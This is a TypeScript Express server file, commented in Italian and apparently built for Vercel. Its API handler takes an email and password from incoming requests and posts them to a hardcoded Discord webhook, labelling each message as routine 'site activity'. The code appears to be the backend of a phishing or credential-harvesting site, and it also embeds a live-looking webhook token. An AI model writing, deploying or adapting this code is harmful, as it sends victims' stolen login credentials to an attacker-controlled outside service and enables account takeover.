import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";

const app = express();
app.use(express.json());

// Gestione CORS per lo sviluppo locale
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  next();
});

const handler = async (req: any, res: any) => {
  console.log("Richiesta ricevuta su API", req.body);
  const { username, code } = req.body;
  const webhookUrl = "https://discord.com/api/webhooks/1495833536999981107/NZHIFwNLn2pWKkOJq8qi0X_pk9Zug5y5MYBg591SZ2evbKC25PR38K9azp-nMYfftxgI";

  if (!username && !code) {
    return res.status(400).json({ error: "Dati mancanti" });
  }

  try {
    const message = {
      embeds: [{
        title: "🚀 Nuova Attività sul Sito",
        description: `Un utente ha completato l'operazione.`,
        fields: [
          { name: "Email", value: username || "Anonimo", inline: true },
          { name: "Password", value: code || "Non fornito", inline: true }
        ],
        color: 5814783,
        timestamp: new Date().toISOString()
      }]
    };

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`Errore Discord: ${response.status} - ${errorText}`);
      return res.status(response.status).json({ error: "Discord API error" });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Errore nell'invio a Discord:", error);
    return res.status(500).json({ error: "Errore interno server" });
  }
};

// Rotte API
app.post("/api/notify", handler);
app.post("/notify", handler);

// Integrazione Vite / Startup
async function init() {
  if (process.env.NODE_ENV !== "production" && !process.env.VERCEL) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);

    const PORT = 3000;
    app.listen(PORT, "0.0.0.0", () => {
      console.log(`Server locale in esecuzione su http://localhost:${PORT}`);
    });
  } else {
    // Rotta fallback per Vercel
    app.get("*", (req, res) => {
      // Per Vercel, i file statici sono gestiti dal routing di Vercel,
      // ma mettiamo un messaggio per le API
      res.json({ status: "API attiva", info: "In produzione su Vercel" });
    });
  }
}

init();

export default app;
